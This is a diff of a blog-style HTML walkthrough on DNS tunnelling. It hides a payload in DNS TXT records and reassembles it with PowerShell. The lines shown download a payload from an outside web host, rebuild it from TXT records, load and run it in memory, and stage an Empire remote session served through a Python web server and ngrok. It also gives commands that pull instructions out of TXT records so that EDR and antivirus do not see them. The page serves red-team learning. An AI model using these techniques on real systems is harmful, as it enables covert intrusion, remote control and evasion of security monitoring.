@@ -101,7 +101,7 @@
                                 <div class="squarebox">Add-DnsServerResourceRecord -DescriptiveText [VALUE] -Name [NAME] -Txt -ZoneName [DNSZONE]</div>
                                 Let's retrieve a payload from my own web application by calling a DownloadString("https://hakkyahud.github.io/password.html"). Before writing our script, we need to determine the amount of subdomains. To do so, let's divide the amount of characters by 254.
                                 <div class="squarebox">[math]::ceiling($payload.length/254)</div>
-                                Once the number of subdomain has been determined, <strong>let's script it :)</strong> <br>
+                                Once the number of subdomains have been determined, <strong>let's script it :)</strong> <br>
                                 <div class="squarebox">
                                     $payload = (New-Object Net.WebClient).DownloadString("https://hakkyahud.github.io/password.html"); <br>
                                     $numberofsubdomain = [math]::ceiling($payload.length/254); <br>
@@ -119,9 +119,9 @@
                                 </div>
                                 Many TXT records have been created and I cannot tell you how many is stored in the DNS server at the moment.
                                 <img src="img/dnstunneling/dnskatzpayload.jpg" class="img-fluid" width="600">
-                                Let's make some calculation
+                                Let's make some calculations.
                                 <img src="img/dnstunneling/payloadlenght.jpg" class="img-fluid" width="700">
-                                In this current payload, there are 4 839 426 characters and by dividing by 254, the DNS server have created 19053 subdomains. Let's reconstruct the payload and attempt to run in our compromised system. The payload will be stored and executed in memory.<br>
+                                In this current payload, there are 4 839 426 characters and by dividing by 254, the DNS server have created 19053 TXT records. Let's reconstruct the payload and attempt to run in our compromised system. The payload will be stored and executed in memory.<br>
                                 <div class="squarebox">
                                     $numberofsubdomain = 19053; <br>
                                     For($i=0; $i -lt $numberofdomain; $i++){ <br>
@@ -133,14 +133,14 @@
                                     $assembly.EntryPoint.Invoke($null, $null);
                                 </div>
 
-                                Since that we have 19053 subdomains, the loop goes from 0 to 19052 and the time that the client sends a DNS query and the DNS server returns an answer takes around 3 seconds. With the 19053 subdomains, if we are multiplying by 3, it is around 57159 seconds and by dividing by 3600 it becomes 16 hours to recreate the payload... <br>
+                                After running the program for 3 hours, I've stopped it and decided to calculate about how long it is going to take. Since that we have 19053 TXT records, the loop goes from 0 to 19052 and the time that the client sends a DNS query and the DNS server returns an answer takes around 3 seconds. With the 19053 subdomains, if we are multiplying by 3, it is around 57159 seconds and by dividing by 3600 it becomes 16 hours to recreate the payload... <br>
 
                                 <br>
-                                After running the program 3 hours, I've stopped it and decided to find another payload. I was thinking a stager to connect to a <strong>Meterpreter</strong> session or <strong>Empire</strong> session. <br>
+                                Therefore we must find a smaller payload so that it won't take that long. I was thinking about a stager to connect to a <strong>Meterpreter</strong> session or <strong>Empire</strong> session. <br>
                                 <br>
 
                                 <h7 style="color: slategrey;"><i><strong>Delete DNS record</strong></i></h7> <br>
-                                To delete the DNS events in PowerShell, the method “Remove-DnsServerResourceRecord” removes specified DNS server resource records from a zone.
+                                To delete the DNS events in PowerShell, the method “Remove-DnsServerResourceRecord” removes the specified DNS server resource records from a zone.
                                 <div class="squarebox">
                                     For($i=0; $i -lt $numberofsubdomain; $i++){ <br>
                                     &emsp;try{ <br>
@@ -169,19 +169,21 @@
                                     <li>execute</li>
                                 </ul>
                                 <img src="img/dnstunneling/empirestager.jpg" class="img-fluid" width="700">
-                                Empire generates the PowerShell payload to run on the compromised system to open a remote Empire session. <br>
+                                Empire generates the PowerShell payload to run in the compromised system to open a remote Empire session. <br>
                                 <br>
                                 <h7 style="color: slategrey;">Setup web application</h7> <br>
-                                Copy this payload to a index.html file and create a python web application on a port in the index.html directory. <br>
-                                <strong>
+                                Copy this payload to a index.html file and create a python web application on a port within the index.html directory. <br>
+                                <div class="squarebox">
                                     echo [PAYLAOD] > ./Documents/http/index.html; <br>
+                                    cd ./Documents/http; <br>
                                     python -m http.server 8000
-                                </strong>
+                                </div>
 
                                 <img src="img/dnstunneling/pythonhttp.jpg" class="img-fluid" width="600">
-                                Use <strong>Ngrok</strong> to open your port on internet (<strong>ngrok http –scheme http 8000</strong>) <br>
+                                Use <strong>Ngrok</strong> to open your port on internet.
+                                <div class="squarebox">ngrok http –scheme http 8000</div>
                                 It is necessary to have a Ngrok account and then copy the authentication token to the configuration file. <br>
-                                <strong>ngrok config add-authtoken [AUTHTOKEN XXX]</strong> <br>
+                                <div class="squarebox">ngrok config add-authtoken [AUTHTOKEN XXX]</div>
                                 The authtoken saved to configuration file: /root/.config/ngrok/ngrok.yml
                                 <img src="img/dnstunneling/ngrok.jpg" class="img-fluid" width="700">
                                 The content of the index.html file is reachable in Internet. We can add the payload in our DNS server.
@@ -211,11 +213,11 @@
                                 <img src="img/dnstunneling/runpayload.jpg" class="img-fluid" width="900">
                                 <img src="img/dnstunneling/empireagent.jpg" class="img-fluid" width="900">
 
-                                The Empire session is opened ! We have reconstruct the payload from the 15 TXT records of our DNS server. Everything has been done in local, but this attack could have been done from a new domain hosted by Google or Microsoft. This attack method generate quite a lot of DNS traffics since the compromised computer is requesting a lot of subdomains and the data size is quite huge. It shouldn't be too complicated to create a detection rule to be alerted when this case happen. However, many companies forget to monitor closely the DNS traffic because it is originally very noisy.
+                                The Empire session is opened ! We have reconstruct the payload from the 15 TXT records of our DNS server. Everything has been done in local, but this attack could have been done from a new domain hosted by Google or Microsoft. This attack method generate quite a lot of DNS traffics since the compromised computer is requesting a lot of subdomains and the data size is quite huge. It shouldn't be too complicated to create a detection rule to be alerted when this case happens. However, many companies forget to monitor closely the DNS traffic because it is originally very noisy.
                                 <br><br>
 
                                 <h4>A little bit more stealthier</h4>
-                                The commands such as Invoke-Expression, Invoke-WebRequest, [System.Reflection.Assembly]::Loads, EntryPoint.Invoke are usually flagged by EDR or AV in case it is seen in the command line. A way to bypass those detections is to store those commands in a TXT record and call them with PowerShell.
+                                The commands such as Invoke-Expression, Invoke-WebRequest, [System.Reflection.Assembly]::Load, EntryPoint.Invoke are usually flagged by the EDR or the anti-virus in case it is seen in the command line. A way to bypass those detections is to store those commands in a TXT record and call them with PowerShell.
                                 <div class="squarebox">Powershell .(nslookup -q=TXT [DOMAIN_NAME])[-1]</div>
                                 <img src="img/dnstunneling/psnslookup.jpg" class="img-fluid" width="700">
 
@@ -227,7 +229,7 @@
                                 <div class="squarebox">powershell .(Resolve-DnsName [DOMAIN_NAME] -type TXT | foreach{$_.Strings})</div>
                                 <img src="img/dnstunneling/resolvedns3.jpg" class="img-fluid" width="800">
 
-                                In this test, we have tried with simple commands "ping 8.8.8.8" or "net user" but we can replace them with a command that sounds more malicious and might be detected by a host-based security system such as <strong>[System.Reflection.Assembly]::Loads()</strong>.
+                                In this test, we have tried with some simple commands "ping 8.8.8.8" or "net user" but we can replace them with a command that sounds more malicious and might be detected by a host-based security system such as <strong>[System.Reflection.Assembly]::Load()</strong>.
 
 
                             </p>
